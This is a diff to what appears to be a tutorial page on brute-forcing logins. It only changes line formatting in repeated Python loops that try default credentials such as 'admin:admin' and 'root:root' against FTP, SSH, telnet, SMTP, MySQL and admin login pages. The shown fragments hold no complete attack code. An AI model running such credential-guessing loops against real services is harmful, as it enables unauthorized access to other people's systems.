@@ -276,7 +276,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h3>FTP:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -294,7 +294,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h4>ssh1:</h4>(using pexpect module with "spawn" instead of "pexssh", which is more cleaver) 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -308,7 +308,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h4>ssh2:</h4>(using paramiko module) 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -326,7 +326,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h4>telnet1:</h4>(using pexpect module with "spawn" instead of "pexssh", which is more cleaver) 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -340,7 +340,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h4>telnet2:</h4>(using telnetlib module) 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -354,7 +354,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h3>SMTP:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -367,7 +367,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h3>MYSQL:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -380,7 +380,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br><h3>ADMIN LOGIN:</h3>
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
@@ -396,7 +396,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 
 
 >>>wordlist=["admin:admin","admin:12345","root:root"]
->>>for x in wordlist:
+<br>for x in wordlist:
 <br> user=x.split(":")[0]
 <br> pwd=x.split(":")[1]
 <br> print'"[*]Trying:",user,pwd
